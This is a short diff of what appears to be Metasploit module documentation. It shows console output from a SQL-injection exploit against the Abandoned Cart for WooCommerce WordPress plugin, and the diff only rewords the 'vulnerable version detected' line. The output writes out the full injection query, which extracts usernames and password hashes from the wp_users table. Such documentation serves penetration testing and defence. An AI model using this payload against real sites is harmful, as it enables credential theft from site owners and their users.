@@ -61,7 +61,7 @@ count => 3
 resource (abandoned.rb)> run
 [*] Checking /wp-content/plugins/woocommerce-abandoned-cart/readme.txt
 [*] Found version You in the plugin
-[+] Vulnerable version detected
+[+] Vulnerable version of Abandoned Cart for WooCommerce detected
 [*] Nonce: b56eb3a2cb
 [*] Enumerating Usernames and Password Hashes
 [*] {SQLi} Executing (select group_concat(PghfuFZ) from (select cast(concat_ws(';',ifnull(user_login,''),ifnull(user_pass,'')) as binary) PghfuFZ from wp_users limit 3) eOMLbNMh)
